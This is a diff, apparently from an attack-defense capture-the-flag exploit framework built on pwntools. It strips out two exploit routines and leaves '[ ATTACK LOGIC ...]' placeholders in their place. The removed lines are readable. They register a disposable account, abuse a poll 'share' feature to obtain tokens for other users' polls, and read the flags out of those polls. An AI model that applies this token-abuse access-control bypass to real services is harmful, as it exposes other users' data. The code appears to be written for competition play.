@@ -76,41 +76,13 @@ def exploit(target_ip):
         return []
 
     flags = []
-    p.recvuntil(b"]: ")
-    p.sendline(b"register")
-    p.sendlineafter(b"username: ", uuid.uuid4().hex.encode("ascii"))
-    p.sendlineafter(b"password: ", uuid.uuid4().hex.encode("ascii"))
-    p.recv(timeout=0.5)
 
-    for poll in get_polls_dict():
-        poll = json.loads(poll)
-        poll_id = poll["poll_id"]
-        username = poll["username"]
-        log.debug(f"{poll_id = }, {username = }")
-
-        p.sendline(b"access poll")
-        p.sendlineafter(b"back): ", b"share")
-        p.recv(timeout=0.5)
-        p.sendline(poll_id.encode("ascii"))
-        data = p.recv(timeout=0.5)
-        if "not" in str(data):
-            log.debug(f"{target_ip} patched this vulnerability!")
-            break
-
-        token = str(data).split(": ")[1][:-3]
-        log.debug(f"{token = }")
-        p.sendlineafter(b"exit]: ", b"use token")
-        p.sendlineafter(b"Token: ", token)
-        p.sendlineafter(b"exit]: ", b"access poll")
-        p.sendlineafter(b"back): ", b"show")
-        p.sendlineafter(b"id: ", poll_id)
-
-        data = p.recv(timeout=0.5)
-        flag = str(data).split(", ")[0]
-        flag = str.replace(flag, "\\n", "")
-        flag = str.replace(flag, " ", "")
-
-        flags.append(flag[2:])
+    
+    """
+    [ ATTACK LOGIC ...]
+    
+    """
+    
 
     log.success(f"{flags}")
     return flags
@@ -154,47 +126,12 @@ def share(target_ip):
         return []
 
     flags = []
-    p.recvuntil(b"]: ")
-    p.sendline(b"register")
-    p.sendlineafter(b"username: ", uuid.uuid4().hex.encode("ascii"))
-    p.sendlineafter(b"password: ", uuid.uuid4().hex.encode("ascii"))
-    p.recv(timeout=0.5)
+    
+    """
+    [ ATTACK LOGIC ...]
+    
+    """
 
-    for poll in get_polls_dict():
-        poll = json.loads(poll)
-        poll_id = poll["poll_id"]
-        username = poll["username"]
-        l.acquire()
-        log.debug(f"{poll_id = }, {username = }")
-        l.release()
-
-        p.sendline(b"access poll")
-        p.sendlineafter(b"back): ", b"share")
-        p.recv(timeout=0.5)
-        p.sendline(poll_id.encode("ascii"))
-        data = p.recv(timeout=0.5)
-        if "not" in str(data):
-            l.acquire()
-            log.debug(f"{target_ip} patched this vulnerability!")
-            l.release()
-            return []
-
-        token = str(data).split(": ")[1][:-3]
-        l.acquire()
-        log.debug(f"{token = }")
-        l.release()
-        p.sendlineafter(b"exit]: ", b"use token")
-        p.sendlineafter(b"Token: ", token)
-        p.sendlineafter(b"exit]: ", b"access poll")
-        p.sendlineafter(b"back): ", b"show")
-        p.sendlineafter(b"id: ", poll_id)
-
-        data = p.recv(timeout=0.5)
-        flag = str(data).split(", ")[0]
-        flag = str.replace(flag, "\\n", "")
-        flag = str.replace(flag, " ", "")
-
-        flags.append(flag[2:])
     l.acquire()
     log.success(f"{flags}")
     l.release()
@@ -204,4 +141,4 @@ def share(target_ip):
 ## TODO
 - [] Add flag submission logic
 - [] Fix live-updating configs and exploits
-- []
+- [] Move from pwn.log to proper logging with handler to distinguis processes and threads
